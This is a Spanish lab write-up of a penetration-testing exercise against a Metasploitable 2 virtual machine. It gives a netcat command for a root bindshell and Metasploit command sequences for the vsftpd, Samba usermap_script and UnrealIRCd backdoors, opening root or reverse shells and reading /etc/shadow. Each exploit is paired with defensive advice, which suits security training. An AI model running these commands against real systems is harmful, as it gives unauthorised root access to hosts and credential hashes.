# Fase 2 — Explotación

## Introducción
Con la información recopilada en la Fase 1 procedemos a explotar
las vulnerabilidades encontradas. Usaremos tanto técnicas manuales
como Metasploit Framework para conseguir acceso a la máquina víctima.

## Objetivos de esta fase
- Explotar la bindshell del puerto 1524 (acceso manual)
- Explotar vsftpd 2.3.4 con Metasploit
- Explotar Samba con Metasploit
- Documentar cada exploit con su CVE y reflexión defensiva

## Entorno
- **Atacante:** Kali Linux — 192.168.85.128
- **Víctima:** Metasploitable 2 — 192.168.85.129

---

## 2.1 · Bindshell — Puerto 1524

**Herramienta:** Netcat (nc)

**¿Qué es una bindshell?**
Una bindshell es una terminal que está escuchando en un puerto esperando
que alguien se conecte. En este caso está en el puerto 1524 con permisos
de root — cualquiera que se conecte tiene control total de la máquina
sin necesitar usuario ni contraseña.

**Comando:**
```bash
nc 192.168.85.129 1524
```

**Resultado:**

<img width="688" height="313" alt="image" src="https://github.com/user-attachments/assets/698538a7-8c2d-4f0f-9b4b-ae01e8720acb" />

     
<img width="255" height="34" alt="image" src="https://github.com/user-attachments/assets/9062f850-0025-4d2d-9133-e07997e3bbf2" />

<img width="635" height="610" alt="image" src="https://github.com/user-attachments/assets/bc21a9ff-46f4-43b8-99d0-6d37d61099c3" />

<img width="600" height="742" alt="image" src="https://github.com/user-attachments/assets/dbcd1fe2-c358-4274-a21b-a66aaa7b08a3" />

**Acceso conseguido:**
- Usuario: root (administrador total)
- Sin usuario, sin contraseña, sin herramientas de hacking
- Acceso a /etc/shadow con todos los hashes de contraseñas del sistema

**Reflexión Blue Team — ¿Cómo se evita?**
Este acceso ha sido posible porque el puerto 1524 tiene una shell
de root directamente expuesta. En un sistema real esto jamás debería
existir. La solución es cerrar ese puerto con el firewall y auditar
regularmente los puertos abiertos del sistema.

---

## 2.2 · vsftpd 2.3.4 Backdoor — Metasploit

**Herramienta:** Metasploit Framework

**CVE:** CVE-2011-2523

**¿Qué es esta vulnerabilidad?**
En 2011 alguien comprometió el código fuente oficial de vsftpd 2.3.4
e introdujo una backdoor. Cuando un usuario intenta hacer login con
un usuario que contiene ":)" al final, el servidor abre una shell
de root en el puerto 6200. Es una de las vulnerabilidades más famosas
de la historia del FTP.

**Comandos utilizados:**
```bash
msfconsole
search vsftpd
use 1
set RHOSTS 192.168.85.129
set LHOST 192.168.85.128
run
```

**Resultado:**

<img width="722" height="494" alt="image" src="https://github.com/user-attachments/assets/a8a0c1f2-cd24-41ee-8166-04ac07829ecf" />

<img width="1126" height="292" alt="image" src="https://github.com/user-attachments/assets/4ae39161-eae8-40b1-a1d8-fda072a60ad2" />

<img width="946" height="820" alt="image" src="https://github.com/user-attachments/assets/aa50bb18-6096-42bd-aca5-382ac7202ab3" />

<img width="870" height="748" alt="image" src="https://github.com/user-attachments/assets/7efa289e-e570-4950-9d9e-7c9cf36dce4c" />

<img width="408" height="160" alt="image" src="https://github.com/user-attachments/assets/965b00b4-d8f1-45d0-aee2-fdf733c3e1c7" />

**Acceso conseguido:**
- Usuario: root
- Sistema: Ubuntu 8.04 Linux 2.6.24
- Sesión Meterpreter abierta entre Kali y Metasploitable

**Reflexión Blue Team — ¿Cómo se evita?**
- Actualizar vsftpd a una versión no comprometida
- Verificar siempre la integridad del software descargado (hash MD5/SHA)
- Cerrar el puerto 21 si no es estrictamente necesario
- Usar SFTP en vez de FTP — cifrado y más seguro

---


## 2.3 · Samba usermap_script — Metasploit

**Herramienta:** Metasploit Framework

**CVE:** CVE-2007-2447

**¿Qué es esta vulnerabilidad?**
Samba 3.0.20 a 3.0.25rc3 tiene una vulnerabilidad en el parámetro
"username map script" que permite ejecutar comandos arbitrarios en
el servidor sin autenticación. Cuando se envía un nombre de usuario
con metacaracteres de shell, Samba los ejecuta directamente como root.
Es una vulnerabilidad de 2007 que sigue presente en sistemas sin actualizar.

**Comandos utilizados:**
```bash
search samba usermap
use 0
set RHOSTS 192.168.85.129
set LHOST 192.168.85.128
run
```

**Diferencia con el exploit anterior:**
Este exploit usa una **reverse shell** — es Metasploitable quien se conecta
de vuelta a Kali (192.168.85.129 → 192.168.85.128:4444), no al revés.
Por eso el LHOST es imprescindible.

**Resultado:**

<img width="885" height="325" alt="image" src="https://github.com/user-attachments/assets/a9f713a1-41e5-457c-8066-30dc631b1adc" />


<img width="1170" height="552" alt="image" src="https://github.com/user-attachments/assets/e545cc5f-a386-48d6-836a-8c9d3cedbe76" />


**Acceso conseguido:**
- Usuario: root
- Puerto atacado: 139 (NetBIOS/Samba)
- Tipo de shell: Command shell (sin prompt)

**Reflexión Blue Team — ¿Cómo se evita?**
- Actualizar Samba a una versión parcheada
- No exponer los puertos 139 y 445 a redes no confiables
- Deshabilitar el parámetro "username map script" si no se usa
- Firewall para limitar el acceso a servicios SMB

---

## 2.4 · UnrealIRCd 3.2.8.1 Backdoor — Metasploit

**Herramienta:** Metasploit Framework

**CVE:** CVE-2010-2075

**¿Qué es esta vulnerabilidad?**
En 2010 se descubrió que el código fuente oficial de UnrealIRCd 3.2.8.1
había sido comprometido con una backdoor. Cuando se envía la cadena
"AB;" al servidor IRC, ejecuta el comando que viene a continuación
directamente como root. Es el mismo patrón que vsftpd — software
oficial saboteado en el repositorio de descarga.

**Comandos utilizados:**
```bash
search unreal ircd
use 0
set RHOSTS 192.168.85.129
set LHOST 192.168.85.128
run
```

**Resultado:**
El exploit detectó correctamente la vulnerabilidad y envió el comando
de backdoor, pero no fue posible crear una sesión estable.

Se probaron los siguientes payloads sin éxito:
- cmd/unix/reverse_netcat
- cmd/unix/reverse
- cmd/unix/reverse_bash
- cmd/unix/bind_netcat
- cmd/unix/reverse_perl

Al no conseguir sesión con el payload por defecto, consulté con Claude AI
para entender el problema y probar alternativas. La conclusión fue que
el netcat instalado en Metasploitable 2 (Ubuntu 8.04) es demasiado antiguo
y no soporta la opción `-e` necesaria para los payloads reverse shell.
El exploit en sí funciona correctamente — el problema es la incompatibilidad
del payload con el sistema víctima.

**¿Qué confirma esto?**
- La vulnerabilidad existe y fue detectada ✅
- El exploit la activa correctamente ✅
- Sesión no establecida por incompatibilidad de payload ❌

**Reflexión Blue Team — ¿Cómo se evita?**
- Verificar siempre la integridad del software descargado (hash SHA256)
- No usar versiones de IRC de 2010 en producción
- Cerrar el puerto 6667 si no se usa IRC
- Monitorizar conexiones salientes inusuales desde servidores

---
